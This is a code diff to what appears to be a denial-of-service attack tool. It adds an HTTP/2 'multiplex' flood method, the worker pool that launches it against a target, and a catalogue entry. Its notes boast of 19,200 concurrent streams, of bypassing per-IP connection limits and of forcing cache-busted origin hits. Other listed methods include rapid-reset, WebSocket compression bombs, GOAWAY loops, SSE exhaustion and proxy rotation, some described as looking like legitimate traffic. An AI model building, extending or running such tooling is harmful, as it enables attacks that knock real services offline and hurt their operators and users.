@@ -432,6 +432,8 @@ const HTTP_PROXY_METHODS = new Set([
   "tls-session-exhaust", "cache-buster",
   // New H2 vector methods (2025)
   "h2-dep-bomb", "h2-data-flood",
+  // True H2 multiplexing mode (2026) — persistent streams, zero RST
+  "h2-multiplex",
   // New methods (2026)
   "rapid-reset", "ws-compression-bomb", "h2-goaway-loop", "sse-exhaust",
   // Final form — all vectors + proxy rotation
@@ -1296,8 +1298,11 @@ async function runAttackWorkers(
       spawnPool("keepalive-exhaust",   target, port, kaT_ab,    IS_DEPLOYED ? Math.max(6, CPU_COUNT) : 1, signal, onStats),
       spawnPool("cdn-purge-flood",     target, port, purgeT_ab, IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
       spawnPool("dns-ns-flood",        target, port, dnsT_ab,   IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
-      // ★ NEW: CDN pool exhaustion — COMPLETE POST requests trickled to exhaust origin connection pool
+      // ★ CDN pool exhaustion — COMPLETE POST requests trickled to exhaust origin connection pool
       spawnPool("cdn-slow-exhaust",    target, port, slowExT_ab, IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
+      // ★ H2 Multiplex — true persistent stream pooling: 150 sessions x 128 streams = 19,200 concurrent
+      //   10x less RAM than HTTP/1.1, more CPU on server, bypasses per-IP connection limits
+      spawnPool("h2-multiplex",        target, port, Math.max(IS_DEPLOYED ? 150 : 20, Math.round(cdnT_actual * 0.12)), IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
     ];
 
     // ── Front D: Subdomain Spray (deploy only) — STARTS RIGHT NOW ─────────
@@ -1487,6 +1492,7 @@ const METHODS_CATALOGUE = [
   { id: "ws-compression-bomb",  name: "WS Compression Bomb [RFC 7692]",        layer: "L7",   protocol: "WebSocket",            tier: "S",      description: "permessage-deflate 1820× amplification: 36-byte frame → 65535-byte server decompress alloc. no_context_takeover forces per-message inflate state alloc." },
   { id: "h2-goaway-loop",       name: "H2 GOAWAY Loop — Lifecycle Exhaustion", layer: "L7",   protocol: "HTTP/2",               tier: "A",      description: "GOAWAY immediately after H2 setup forces TLS teardown+reconnect cycles: ECDHE key exchange + goroutine alloc/dealloc + H2 state per cycle. 5000 cycles/s." },
   { id: "sse-exhaust",          name: "SSE Exhaust — Event Stream Hold",       layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "Opens 18K Server-Sent Events connections silently. Each holds 1 server goroutine+buffer+FD for 90-180s. Looks like legitimate streaming traffic." },
+  { id: "h2-multiplex",        name: "H2 Multiplex — True Stream Pooling",    layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "True HTTP/2 multiplexing: N sessions x maxConcurrentStreams open simultaneously. Zero RST — each stream reads full response, then instantly replaced. 10x fewer TCP conns vs HTTP/1.1 for same load. Dev: 20 sessions x 32 streams = 640 concurrent. Prod: 150 x 128 = 19,200 concurrent. Bypasses per-IP conn limits. 60% GET + 40% POST with real bodies forces origin handler dispatch. Cache-busted URLs force 100% origin hit." },
 ];
 
 // ── Routes ────────────────────────────────────────────────────────────────
